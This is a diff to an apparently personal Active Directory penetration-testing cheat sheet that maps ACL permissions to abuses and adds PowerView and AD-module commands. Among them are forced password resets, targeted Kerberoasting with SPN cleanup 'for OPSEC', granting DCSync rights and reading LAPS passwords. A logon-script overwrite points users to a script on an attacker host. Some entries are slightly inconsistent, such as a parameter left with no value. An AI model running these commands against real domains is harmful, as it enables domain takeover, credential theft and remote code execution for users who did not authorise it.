@@ -62,13 +62,21 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	
 
 ## ACLs possible abuse
-ACL/ACE | Permission | Abuse
---- | --- | ---
-**GenericAll** | full rights to user/computer object | [Force change user's password](#force-change-user-password)
-**GenericWrite** | Write/update object's attributes | [RBCD](#resource-based-constrained-delegation), [Targeted Kerberoast](#targeted-kerberoast), [Force change user's password](#force-change-user-password)
-**WriteDACL** | modify object's ACE (full control) | [Give owned users DCsync Privilege](#add-dcsync-to-object)
-**WriteOwner** | change owner/password | [Change user's password with credential](#change-password-with-credential)
-**Self-Membership** | ability to add ourself to a group | [Add owned users to other group](#add-users-to-group)
+ACL/ACE | Object | Permission | Abuse
+--- | --- | --- | ---
+**GenericAll** | User  | full rights | [Force change user's password](#force-change-user-password), [Targeted Kerberoast](#targeted-kerberoast)
+**GenericAll** | Group  | full rights | [Self add to group](#add-users-to-group)
+**GenericAll** | Computer  | full rights | [RBCD](#resource-based-contrained-delegation)
+**GenericWrite/WriteProperty** | User | Write/update object's attributes | [Targeted Kerberoast](#targeted-kerberoast), [Overwrite Logon Script](#overwrite-logon-script)
+**GenericWrite** | Group | ability to self add to group | [Self add to group](#add-users-to-group)
+**GenericWrite/WriteProperty** | Computer | Write/update object's attributes | [RBCD](#resource-based-constrained-delegation)
+**WriteDACL** | Domain | modify object's ACE (full control) | [Give owned users DCsync Privilege](#add-dcsync-to-object)
+**WriteOwner** | User  | change owner/password | [Change user's password with credential](#change-password-with-credential)
+**Self-Membership/Self** | Group | ability to add ourself to the group | [Self add to group](#add-users-to-group)
+**AllExtendedRights** | User  | change user's password | [Force change user's password](#force-change-user-password)
+**AllExtendedRights** | Group  | Read LAPS Password | [Read LAPS Password](#read-laps-local-administrator-password)
+**User-Force-Change-Password** | User | change user's password | [Force change user's password](#force-change-user-password)
+
 
 ## Domain Enumeration
 ### Forest Trust
@@ -203,17 +211,32 @@ Set-DomainUserPassword -Identity studentadmin -Domain contoso.local -AccountPass
 ```
 Add-DomainGroupMember -Identity studentadmins -Members studentuser
 ```
+
 ### Targeted Kerberoast
+This technique will update `ServicePrincipalName` of a user object. Make sure to have a write permission on the user's attributes.
 ```
 # Set SPN
-Set-DomainObject -Identity sqlsvc -Set @{serviceprincipalname='my\sqlspn'}
+Set-DomainObject -Identity sqlsvc -Set @{serviceprincipalname='my/sqlspn'}
 
 # Clear SPN (OPSEC)
 Set-DomainObject -Identity sqlsvc -Clear serviceprincipalname
 ```
+
+### Overwrite Logon Script
+Logon Script will run everytime user logged in._(note: use ad module)_
+```
+Set-ADObject -SamAccountName  -PropertyName scriptpath -PropertyValue "\\attackerip\script.ps1"
+```
+
 ### Add DCSync Privilege to object
 ```
 Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" -PrincipalIdentity studentuser -Rights DCSync
+```
+
+### Read LAPS Local Administrator Password
+This will only possible if you have _AllExtendedRights_ permission on a computer object.
+```
+Get-DomainComputer -Properties ms-mcs-admpwd
 ```
 
 ## SQL Server Enumeration and Code Execution
